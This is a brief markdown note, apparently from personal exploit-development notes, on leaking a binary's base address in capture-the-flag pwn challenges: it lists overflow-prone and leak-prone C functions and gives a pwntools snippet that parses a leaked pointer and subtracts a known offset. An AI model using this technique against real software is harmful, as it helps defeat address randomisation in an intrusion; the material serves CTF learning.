# Find Binary offset



## Find a memory address leak

A memory address can be found with an overflow or an information leak.

Overflowable functions

* scanf() - without boundry check, or with a wrong boundry check
* gets() - without boundry check, or with a wrong boundry check
* strcpy()
* strcat()
* strncat() - with a wrong boundry check

Leakable functions

* read()
* strncpy()
* fread()
  
for a better overview of the conditions go to [CTF-pwn-tips](https://github.com/Naetw/CTF-pwn-tips/blob/master/README.md#overflow)

![Memory Leak example](https://github.com/WoodenshoeNL/event-horizon/blob/main/exploit_development/memory-address-leak-htb-challenge-pwnshop.png?raw=true)

## Calculate Memory offset

Example code to get the offset with pwntools

```python
io.sendlineafter('> ', payload)

binary_offset = io.recvline().split(payload)[1].split(b'?')[0]      #isolate address
binary_offset = bytearray(binary_offset).ljust(8, b'\x00')          #add address to bytearray adjust to right amount of bytes
binary_offset = u64(binary_offset, endian='little')                 #unpack
binary_offset -= 0x40c0                                             #subtract known offset - get from gdb or ghidra
log.success(f'Leaked binary offset: {str(hex(binary_offset))}')     #print offset
```
